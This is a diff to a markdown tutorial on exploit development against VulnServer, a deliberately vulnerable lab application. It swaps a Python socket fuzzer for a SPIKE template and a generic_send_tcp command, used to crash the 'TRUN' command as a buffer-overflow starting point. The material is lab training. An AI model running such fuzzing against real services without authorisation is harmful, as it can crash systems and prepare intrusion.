@@ -48,38 +48,31 @@ In this project, we'll:
 
 ## Step 1: Fuzzing the Application
 
-We'll start by creating a fuzzing script to identify if and where the vulnerability exists. While tools like SPIKE can be used, we'll create a simple Python script for better understanding:
+We'll start by creating a fuzzing script to identify if and where the vulnerability exists SPIKE tool.
 
-```python
-#!/usr/bin/python3
-import socket
-import sys
-import time
+Create a fuzzer.spk file:
 
-# Create a TCP connection
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("192.168.177.130", 9999))
-
-# Initial banner
-data = s.recv(1024)
-print(data.decode())
-
-# Fuzzing with increasing buffer size
-buffer_length = 100
-while buffer_length < 5000:
-    print(f"Fuzzing TRUN with {buffer_length} bytes")
-    command = b"TRUN /.:/" + b"A" * buffer_length
-    s.send(command)
-    data = s.recv(1024)
-    buffer_length += 100
-    time.sleep(0.5)
+```spk
+s_readline();
+s_string("TRUN ");
+s_string_variable("FUZZ");
 ```
 
-[fuzzing](Images/image2)
+open `vulnserver.exe` with Immunity Debugger, click `F9` to start the server, Then run the fuzzer from kali machine against VunlServer to identify potential buffer overflow:
+
+```bash
+generic_send_tcp [VulnServer_IP] 9999 Fuzzer.spk 0 0
+```
 
 Running this script, we'll see the application crash when we hit a certain buffer length. This confirms the vulnerability exists and gives us a starting point.
 
+![fuzzing](Images/image2.png)
+
 ## Step 2: Finding the Crash Point
+
+Attach `vulnserver.exe` to Immunity debugger, click `F9` to start the server, Then run the fuzing script from the kali machine again
+
+![fuzzing again]()
 
 Once we've confirmed the crash, we need to determine exactly where the crash occurs:
 
